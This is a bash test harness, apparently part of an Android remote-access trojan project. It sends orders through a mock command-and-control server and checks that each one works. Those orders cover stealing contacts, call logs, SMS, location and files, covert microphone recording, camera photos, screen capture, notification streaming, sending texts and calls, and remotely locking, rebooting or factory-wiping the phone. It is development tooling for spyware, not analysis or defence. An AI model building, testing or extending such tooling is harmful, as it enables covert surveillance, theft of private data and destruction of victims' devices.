#!/usr/bin/env bash
# =============================================================================
# feature_test.sh -- drive EVERY order through the mock C2, line by line, and
# report a pass/fail matrix. Destructive orders (lock / reboot / wipe) are only
# run when explicitly enabled so the script is safe to re-run anytime.
#
# Usage:
#   ./tools/feature_test.sh            # non-destructive pass only
#   ./tools/feature_test.sh --lock     # also lock the screen (then unlock)
#   ./tools/feature_test.sh --reboot   # also reboot the device (slow)
#   ./tools/feature_test.sh --wipe     # also factory-reset (VERY last)
#
# Requires: mock C2 running (tools/run_mock_c2.sh), one device connected.
# =============================================================================
set -u

BASE=${BASE:-http://127.0.0.1:42474}
LOG=${LOG:-/tmp/mock_c2.log}
OUT=${OUT:-c2_out}
ADB="adb"
command -v adb >/dev/null 2>&1 || ADB="$HOME/Android/Sdk/platform-tools/adb"

DO_LOCK=0; DO_REBOOT=0; DO_WIPE=0
for a in "$@"; do
    case "$a" in
        --lock) DO_LOCK=1 ;;
        --reboot) DO_REBOOT=1 ;;
        --wipe) DO_WIPE=1 ;;
    esac
done

PASS=0; FAIL=0
declare -a REPORT=()

mark_count() {  # count of app response lines in the mock log
    local n; n=$(grep -c "\[<\] x0000" "$LOG" 2>/dev/null); echo "${n:-0}"
}

marker_count() {  # count of <marker> lines in the mock log (0 if none)
    local m="$1" n; n=$(grep -c "$m" "$LOG" 2>/dev/null); echo "${n:-0}"
}

order() {
    # order <cmd> <timeout> <label> [wait-marker]
    local cmd="$1" timeout="${2:-8}" label="${3:-$1}" marker="${4:-}"
    local before m_before
    before=$(mark_count)
    m_before=0; [ -n "$marker" ] && m_before=$(marker_count "$marker")
    curl -s -X POST "$BASE/api/order" -H 'Content-Type: application/json' \
        -d "{\"order\":\"$cmd\"}" >/dev/null
    local t=0 ok=0
    while [ $t -lt "$timeout" ]; do
        sleep 1; t=$((t+1))
        if [ "$(mark_count)" -gt "$before" ]; then
            if [ -z "$marker" ] || [ "$(marker_count "$marker")" -gt "$m_before" ]; then
                ok=1; break
            fi
        fi
    done
    local res="FAIL"
    if [ "$ok" = "1" ]; then
        res="PASS"; PASS=$((PASS+1))
    else
        FAIL=$((FAIL+1))
    fi
    REPORT+=("$res  $label")
    echo "[$res] $label   (cmd: $cmd)"
}

echo "==> mock C2: $BASE   device responses so far: $(mark_count)"
echo "    start: $(date +%H:%M:%S)"
echo

# --- data collection ---------------------------------------------------------
order "apps" 12 "apps list"
order "cn" 12 "contacts"
order "cl" 12 "call logs"
order "sms" 12 "SMS inbox"
order "ca" 10 "camera list"
order "lm" 12 "location (1st)"
order "lm" 12 "location (2nd - Looper guard)"
order "fm-ls /storage/emulated/0" 12 "file list /sdcard"
order "fm-dl /sdcard/Download/c2_config.json" 12 "file download" "saved binary"
order "run-app com.android.settings" 12 "run-app settings"
order "open-url https://example.com" 12 "open-url"
order "sms-send 5551111 feature-test" 12 "sms-send"
order "call 5551111" 12 "call (dial)"
order "delete /sdcard/Download/nonexistent-xyz.txt" 10 "delete (missing file)"

# --- media -------------------------------------------------------------------
order "mc 3" 20 "mic 3s" "saved binary"
order "cam-on 0" 20 "photo back" "saved photo"
order "cam-on 1" 20 "photo front" "saved photo"
order "sc" 15 "screen capture #1" "saved photo"
order "sc" 15 "screen capture #2" "saved photo"

# --- notifications (adb-posted, listener streams to C2) -----------------------
echo "==> posting a test notification"
$ADB shell cmd notification post -S bigtext -t "C2 feature test" tag1 "notification listener check" >/dev/null 2>&1
t=0; ok=0
while [ $t -lt 15 ]; do
    sleep 1; t=$((t+1))
    if grep -q "\[<\] x0000nt" "$LOG" 2>/dev/null; then ok=1; break; fi
done
if [ "$ok" = "1" ]; then
    PASS=$((PASS+1)); REPORT+=("PASS  notifications (x0000nt)")
    echo "[PASS] notifications (x0000nt)"
else
    FAIL=$((FAIL+1)); REPORT+=("FAIL  notifications (x0000nt)")
    echo "[FAIL] notifications (x0000nt)"
fi

# --- destructive (opt-in) ------------------------------------------------------
if [ "$DO_LOCK" = "1" ]; then
    order "lock" 12 "lock device"
    sleep 2
    $ADB shell input keyevent 82 >/dev/null 2>&1 || true   # unlock (MENU)
    $ADB shell wm dismiss-keyguard >/dev/null 2>&1 || true
    echo "    (unlocked)"
fi

if [ "$DO_REBOOT" = "1" ]; then
    order "reboot" 15 "reboot device"
    echo "    waiting for the device to come back (boot receiver test) ..."
    $ADB wait-for-device 2>/dev/null
    for i in $(seq 1 90); do   # up to ~90s to fully boot + reconnect
        sleep 3
        if grep -q "DEVICE CONNECTED" "$LOG" 2>/dev/null; then
            echo "    device reconnected after reboot"
            break
        fi
    done
fi

if [ "$DO_WIPE" = "1" ]; then
    order "wipe" 15 "wipe (factory reset)"
fi

# --- summary -------------------------------------------------------------------
echo
echo "==> RESULTS  (pass=$PASS fail=$FAIL)"
for r in "${REPORT[@]}"; do echo "  $r"; done
echo "    end: $(date +%H:%M:%S)"
[ "$FAIL" = "0" ] && echo "ALL GREEN" || echo "SOME FAILURES - check /tmp/mock_c2.log and c2_out/"
exit $FAIL
